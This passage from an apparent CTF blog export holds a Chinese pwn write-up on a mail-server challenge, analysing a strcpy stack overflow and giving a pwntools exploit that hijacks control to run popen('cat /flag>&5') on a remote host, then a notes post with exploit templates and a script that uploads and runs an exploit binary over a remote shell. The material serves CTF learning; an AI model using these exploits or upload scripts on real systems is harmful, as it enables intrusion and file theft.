class=\"comment\">// 通过hostname、service和hints限定域名、服务/端口、期望的addrinfo来返回addrinfo结构链表（result）</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getaddrinfo</span><span class=\"params\">( <span class=\"type\">const</span> <span class=\"type\">char</span> *hostname, <span class=\"type\">const</span> <span class=\"type\">char</span> *service, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> addrinfo *hints, <span class=\"keyword\">struct</span> addrinfo **result )</span>;</span><br><span class=\"line\">getaddrinfo(<span class=\"number\">0</span>, service, &amp;s, &amp;pai);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 之后通过这个链表来创建socket</span></span><br><span class=\"line\">fd = socket(pai-&gt;ai_family, pai-&gt;ai_socktype, pai-&gt;ai_protocol);</span><br></pre></td></tr></table></figure>\n\n<p>之后设置socket的选项，绑定本地地址，并在该socket上监听。</p>\n<p>之后使用epoll进行事件触发：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">epoll_data</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr;</span><br><span class=\"line\">    <span class=\"type\">int</span> fd;</span><br><span class=\"line\">    <span class=\"type\">__uint32_t</span> u32;</span><br><span class=\"line\">    <span class=\"type\">__uint64_t</span> u64;</span><br><span class=\"line\">&#125; <span class=\"type\">epoll_data_t</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epoll_event</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">__uint32_t</span> events; <span class=\"comment\">/* Epoll events */</span></span><br><span class=\"line\">    <span class=\"type\">epoll_data_t</span> data; <span class=\"comment\">/* User data variable */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个epoll的句柄，size用来告诉内核这个监听的数目的大致数目，而不是能够处理的事件的最大个数。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create</span><span class=\"params\">(<span class=\"type\">int</span> size)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// epoll的事件注册函数，epoll_ctl向 epoll对象中添加、修改或者删除感兴趣的事件，返回0表示成功，否则返回–1，此时需要根据errno错误码判断错误类型。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_ctl</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"type\">int</span> op, <span class=\"type\">int</span> fd, <span class=\"keyword\">struct</span> epoll_event *event)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等待事件的产生。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误，需要检查 errno错误码判断错误类型。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event * events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>等待连接，监听到连接后便开启一个新线程<code>session_worker</code>对连接进行处理，接收参数<code>arg</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//返回值：成功：fileno 出错：-1</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">accept</span><span class=\"params\">(<span class=\"type\">int</span> sockfd,<span class=\"keyword\">struct</span> sockaddr * addr,<span class=\"type\">socklen_t</span>* addrlen)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">v11 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class=\"line\">arg = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">*(_DWORD *)arg = v11;</span><br><span class=\"line\">*((_DWORD *)arg + <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">pthread_create(&amp;newthread, <span class=\"number\">0</span>, (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))session_worker, arg);</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;listener: initiated a new session worker&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>进<code>session_worker</code>看看：</p>\n<p>首先会保存旧的arg并对其进行reset，arg结构大概如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_arg</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> fd=old_arg.fd;</span><br><span class=\"line\">    <span class=\"type\">int</span> State=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> Mail=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> Recp=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_data</span>* <span class=\"title\">Data</span>;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_data</span>&#123;</span></span><br><span class=\"line\">    dd data_from=<span class=\"number\">0</span>;</span><br><span class=\"line\">    dd data_to=<span class=\"number\">0</span>;</span><br><span class=\"line\">   \tdd recv_msg=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>reset</code>后会显示连接成功，注册事件并继续等待，申请一个0x400的<code>request</code>接收请求。</p>\n<p>在<code>parse_request</code>中对<code>request</code>进行解析，会返回一个<code>DWORD[2]</code>的任务编码<code>cmd_code</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cmd</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> code;</span><br><span class=\"line\">    dd argument;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">code=<span class=\"number\">-1</span> argument=<span class=\"number\">0</span>:识别错误</span><br><span class=\"line\">code=<span class=\"number\">0</span> argument=argument_string_start:开头为HELO</span><br><span class=\"line\">code=<span class=\"number\">1</span> argument=argument_string_start:开头为MAIL FROM:</span><br><span class=\"line\">code=<span class=\"number\">2</span> argument=argument_string_start:开头为RCPT TO:</span><br><span class=\"line\">code=<span class=\"number\">3</span> argument=argument_string_start:开头为DATA</span><br><span class=\"line\">code=<span class=\"number\">4</span> argument=argument_string_start:开头为.\\r\\n或以\\r\\n.\\r\\n结尾</span><br><span class=\"line\">code=<span class=\"number\">5</span> argument=argument_string_start:开头为QUIT</span><br><span class=\"line\">argument_string_start可以为null</span><br></pre></td></tr></table></figure>\n\n<p>在这之后，如果满足<code>old_arg-&gt;State == 4 || *(_DWORD *)cmd_code == 4</code>就会走下面的程序流：</p>\n<p>如果满足<code>old_arg-&gt;State == 4 &amp;&amp; *(_DWORD *)cmd_code == 4 &amp;&amp; strlen((const char *)request) &gt; 3</code>，那么就会将<code>recv_msg</code>和<code>request</code>连接在一起放入<code>recv_msg</code>。</p>\n<p>否则会在<code>old_data</code>中保存<code>session_data</code>并将<code>request</code>存在<code>recv_msg</code>中。</p>\n<p>之后就会按照<code>cmd_code</code>进行不同的操作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 均对old_arg操作(初始State=0)</span></span><br><span class=\"line\">code=<span class=\"number\">-1</span>:syntax error</span><br><span class=\"line\">code=<span class=\"number\">0</span>:reset(old_arg)，设置State=<span class=\"number\">1</span>并执行Recp=argument</span><br><span class=\"line\">code=<span class=\"number\">1</span>:需要State==<span class=\"number\">1</span>，设置State=<span class=\"number\">2</span>并执行Data-&gt;data_from=argument</span><br><span class=\"line\">code=<span class=\"number\">2</span>:需要State==<span class=\"number\">2</span> or ==<span class=\"number\">3</span>，设置State=<span class=\"number\">3</span>并执行Data-&gt;data_to=argument</span><br><span class=\"line\">code=<span class=\"number\">3</span>:需要State!=<span class=\"number\">3</span>，设置State=<span class=\"number\">4</span></span><br><span class=\"line\">code=<span class=\"number\">4</span>:需要State==<span class=\"number\">4</span>，创建一个新线程sender_worker提交Data，reset(old_arg)，设置State=<span class=\"number\">1</span></span><br><span class=\"line\">code=<span class=\"number\">5</span>:需要State==<span class=\"number\">5</span>，设置State=<span class=\"number\">5</span>，会结束这次session</span><br></pre></td></tr></table></figure>\n\n<p>否则，也就是<code>old_arg-&gt;State == 4 || *(_DWORD *)cmd_code == 4</code>不满足：</p>\n<p>如果<code>recv_msg</code>中有内容，那么就会将<code>recv_msg</code>和<code>request</code>连接在一起放入<code>recv_msg</code>，否则直接将<code>request</code>放入<code>recv_msg</code></p>\n<p>再深入看看<code>sender_worker</code>：</p>\n<p>输出<code>data_from</code>，若其长度&lt;= 0x4F则copy到<code>bss段中的from</code>处</p>\n<p>输出<code>data_to</code>，若其长度&gt;0xFF(255)则copy到s处，存在<strong>栈溢出</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> s[<span class=\"number\">256</span>]; <span class=\"comment\">// [esp+Ch] [ebp-10Ch] BYREF  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( len &lt;= <span class=\"number\">0xFF</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sender: TO: %s\\n&quot;</span>, v3-&gt;data_to);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(s, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)v3-&gt;data_to);       <span class=\"comment\">// 栈溢出</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sender: TO: %s\\n&quot;</span>, s);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后输出<code>recv_msg</code>。</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>在<code>sender_worker</code>中存在栈溢出，若<code>data_to</code>长度&gt;0xFF(255)则copy到s(ebp-0x10c)处，存在<strong>栈溢出</strong>。若<code>data_from</code>长度&lt;= 0x4F则copy到<code>bss段中的from</code>处。</p>\n<p>由于每次都会创建一个新的<code>sender_worker</code>线程完成工作，因此难以采取ret2libc。但<code>data_from</code>保存在<code>bss</code>段中，可以试试往里面写入shellcode（虽然这里是RW，但还是试试吧），通过栈溢出劫持程序到此处运行shellcode。</p>\n<p>尝试的时候遇到了个问题，程序会卡在一个地方。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\"># eax=0x61616161</span></span><br><span class=\"line\">  0x8049ac5 &lt;sender_worker+295&gt;    add    esp, 0x10</span><br><span class=\"line\">  0x8049ac8 &lt;sender_worker+298&gt;    mov    eax, dword ptr [ebp - 0xc]</span><br><span class=\"line\">► 0x8049acb &lt;sender_worker+301&gt;    mov    eax, dword ptr [eax + 8] <span class=\"comment\"># 会卡在这里</span></span><br><span class=\"line\">  0x8049ace &lt;sender_worker+304&gt;    <span class=\"built_in\">test</span>   eax, eax</span><br><span class=\"line\">  0x8049ad0 &lt;sender_worker+306&gt; </span><br></pre></td></tr></table></figure>\n\n<p>估计是因为变量v3被覆盖，找不到<code>recv_msg</code>了，需要找一个地址<code>addr</code>，并且<code>addr+0x8</code>可以访问。</p>\n<p>最后虽然跳转到覆盖的返回地址，但果然bss段里面的shellcode无法执行。</p>\n<p>据说<code>popen()</code>函数可以执行<code>sh</code>指令，尝试一下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE * <span class=\"title function_\">popen</span><span class=\"params\">( <span class=\"type\">const</span> <span class=\"type\">char</span> * command,<span class=\"type\">const</span> <span class=\"type\">char</span> * type)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令。参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果 type 为 r，那么调用进程读进 command 的标准输出。</span></span><br><span class=\"line\"><span class=\"comment\">//如果 type 为 w，那么调用进程写到 command 的标准输入。</span></span><br></pre></td></tr></table></figure>\n\n<p>执行<code>sh</code>好像没有用，虽然运行了<code>/bin/dash</code>，但输出过去的信息不会产生作用，不知道是不是因为没有send回来。</p>\n<p>后面换了<code>cat /flag&gt;&amp;5</code>，在本地起的可以返回<code>flag</code>。</p>\n<p>但远程的不行，可能是因为本地用的<code>fd</code>刚好是5，但远程的不是。</p>\n<p>爆破远程的<code>fd</code>到1030都不行，可能是因为其他原因吧，docker的和远程一样都不行。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;localhost&#x27;,9999)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;43.142.108.3&#x27;</span>,<span class=\"number\">28972</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Hello</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;HELO&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Mail_from</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;MAIL FROM:&#x27;</span>+content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Rcpt_to</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;RCPT TO:&#x27;</span>+content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Data</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;DATA&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Sender</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;.\\r\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">a_str=<span class=\"number\">0x0804B141</span></span><br><span class=\"line\">from_addr=<span class=\"number\">0x0804d140</span></span><br><span class=\"line\">Hello()</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;cat /flag&gt;&amp;5&quot;</span></span><br><span class=\"line\">Mail_from(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x100</span>+p32(from_addr+<span class=\"number\">0x40</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xc</span>+p32(elf.plt[<span class=\"string\">&#x27;popen&#x27;</span>])+p32(<span class=\"number\">0xdeadbeef</span>)+p32(from_addr)+p32(elf.search(<span class=\"string\">b&quot;r\\x00&quot;</span>).__next__())</span><br><span class=\"line\">Rcpt_to(payload)</span><br><span class=\"line\">Data()</span><br><span class=\"line\">Sender()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;250 Ok\\n&quot;</span>)</span><br><span class=\"line\">flag=ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;flag&quot;</span>,flag)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"pwn的Misc","date":"2023-01-01T16:01:10.000Z","_content":"pwn的一些杂七杂八的命令\n<!--more-->\n\n## 杂项\n\n更换libc\n\n```sh\npatchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename\n\n# 高版本libc用ld-linux-x86-64.so.2，除此之外还要\nsudo cp -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/\n```\n\n## exp模板\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename=''\nelf=ELF('./'+filename)\n#libc=ELF('')\np=process('./'+filename)\n#p=process([\"qemu-arm\",\"-L\",\"...\",\"-g\", \"8888\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nitr()\n\n```\n\n远程脚本\n\n```py\nfrom pwn import *\nimport base64\n#context.log_level = \"debug\"\n\nwith open(\"./exp\", \"rb\") as f:\n    exp = base64.b64encode(f.read())\n\np = remote(\"127.0.0.1\", 11451)\n#p = process('./run.sh')\ntry_count = 1\nwhile True:\n    p.sendline()\n    p.recvuntil(\"/ $\")\n\n    count = 0\n    for i in range(0, len(exp), 0x200):\n        p.sendline(\"echo -n \\\"\" + exp[i:i + 0x200].decode() + \"\\\" >> /tmp/b64_exp\")\n        count += 1\n        log.info(\"count: \" + str(count))\n\n    for i in range(count):\n        p.recvuntil(\"/ $\")\n    \n    p.sendline(\"cat /tmp/b64_exp | base64 -d > /tmp/exploit\")\n    p.sendline(\"chmod +x /tmp/exploit\")\n    p.sendline(\"/tmp/exploit \")\n    break\n\np.interactive()\n```\n\n[kernelpwn常用库](./kernelpwn.h)\n\n## kernel指令\n\n```sh\n# 打包cpio\nfind . | cpio -o -H newc > ../core.cpio\n# 静态编译exp\ngcc ./exp.c -o exp -static -masm=intel\n```\n\n## 通用printf_binary\n\n```c\n// this is a universal function to print binary data from a char* array\nvoid print_binary(char* buf, int length){\n\tint index = 0;\n\tchar output_buffer[80];\n\tmemset(output_buffer, '\\0', 80);\n\tmemset(output_buffer, ' ', 0x10);\n\tfor(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){\n\t\tchar temp_buffer[0x10];\n\t\tmemset(temp_buffer, '\\0', 0x10);\n\t\tsprintf(temp_buffer, \"%#5x\", index);\n\t\tstrcpy(output_buffer, temp_buffer);\n\t\toutput_buffer[5] = ' ';\n\t\toutput_buffer[6] = '|';\n\t\toutput_buffer[7] = ' ';\n\t\tfor(int j=0; j<16; j++){\n\t\t\tif(index+j >= length)\n\t\t\t\tsprintf(output_buffer+8+3*j, \"   \");\n\t\t\telse{\n\t\t\t\tsprintf(output_buffer+8+3*j, \"%02x \", ((int)buf[index+j]) & 0xFF);\n\t\t\t\tif(!isprint(buf[index+j]))\n\t\t\t\t\toutput_buffer[58+j] = '.';\n\t\t\t\telse\n\t\t\t\t\toutput_buffer[58+j] = buf[index+j];\n\t\t\t}\n\t\t}\n\t\toutput_buffer[55] = ' ';\n\t\toutput_buffer[56] = '|';\n\t\toutput_buffer[57] = ' ';\n\t\tprintf(\"%s\\n\", output_buffer);\n\t\tmemset(output_buffer+58, '\\0', 16);\n\t\tindex += 16;\n\t}\n}\n```\n\n## gdb带源码调试\n\n首先下载glibc源代码\n\n在gdb中输入命令`directory /usr/src/glibc/glibc-2.31/...`\n\n使用命令`l # list`可以显示源码，debug界面也能看到。\n","source":"_posts/Misc.md","raw":"---\ntitle: pwn的Misc\ndate: 2023-01-02 00:01:10\ncategories: \n- pwn\ntags: \n- pwn\n---\npwn的一些杂七杂八的命令\n<!--more-->\n\n## 杂项\n\n更换libc\n\n```sh\npatchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename\n\n# 高版本libc用ld-linux-x86-64.so.2，除此之外还要\nsudo cp -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/\n```\n\n## exp模板\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename=''\nelf=ELF('./'+filename)\n#libc=ELF('')\np=process('./'+filename)\n#p=process([\"qemu-arm\",\"-L\",\"...\",\"-g\", \"8888\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nitr()\n\n```\n\n远程脚本\n\n```py\nfrom pwn import *\nimport base64\n#context.log_level = \"debug\"\n\nwith open(\"./exp\", \"rb\") as f:\n    exp = base64.b64encode(f.read())\n\np = remote(\"127.0.0.1\", 11451)\n#p = process('./run.sh')\ntry_count = 1\nwhile True:\n    p.sendline()\n    p.recvuntil(\"/ $\")\n\n    count = 0\n    for i in range(0, len(exp), 0x200):\n        p.sendline(\"echo -n \\\"\" + exp[i:i + 0x200].decode() + \"\\\" >> /tmp/b64_exp\")\n        count += 1\n        log.info(\"count: \" + str(count))\n\n    for i in range(count):\n        